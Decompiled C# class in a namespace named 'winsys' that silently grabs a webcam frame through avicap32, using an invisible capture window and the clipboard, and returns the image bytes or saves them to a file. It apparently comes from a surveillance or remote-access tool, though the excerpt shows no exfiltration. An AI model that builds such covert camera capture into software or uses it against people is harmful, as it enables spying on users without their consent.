using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace winsys;

internal class webcam
{
	private const int WM_CAP_CONNECT = 1034;

	private const int WM_CAP_DISCONNECT = 1035;

	private const int WM_CAP_COPY = 1054;

	private const int WM_CAP_GET_FRAME = 1084;

	[DllImport("user32")]
	private static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

	[DllImport("avicap32.dll")]
	private static extern int capCreateCaptureWindowA(string lpsWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

	[DllImport("kernel32.dll")]
	private static extern int GetTickCount();

	public static byte[] Capture(int connectDelay = 1000)
	{
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		try
		{
			Clipboard.Clear();
			int hWnd = capCreateCaptureWindowA("Form1", 0, 0, 0, 350, 350, 0, 0);
			int tickCount = GetTickCount();
			while (GetTickCount() < tickCount + 1000)
			{
			}
			if (SendMessage(hWnd, 1034u, 0, 0) != 0)
			{
				Thread.Sleep(connectDelay);
				SendMessage(hWnd, 1084u, 0, 0);
				SendMessage(hWnd, 1054u, 0, 0);
				SendMessage(hWnd, 1035u, 0, 0);
				Bitmap val = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);
				if (val == null)
				{
					return null;
				}
				using MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Bmp());
				return memoryStream.ToArray();
			}
			return null;
		}
		catch
		{
			return null;
		}
	}

	public static byte[] CaptureSTA(int connectDelay = 1000)
	{
		try
		{
			byte[] bytes = null;
			Thread thread = new Thread((ThreadStart)delegate
			{
				bytes = Capture(connectDelay);
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return bytes;
		}
		catch
		{
			return null;
		}
	}

	public static bool Capture(string filepath, int connectDelay = 1000)
	{
		byte[] array = Capture(connectDelay);
		if (array != null)
		{
			File.WriteAllBytes(filepath, array);
			return true;
		}
		return false;
	}

	public static bool CaptureSTA(string filepath, int connectDelay = 1000)
	{
		bool success = false;
		Thread thread = new Thread((ThreadStart)delegate
		{
			success = Capture(filepath, connectDelay);
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		thread.Join();
		return success;
	}
}
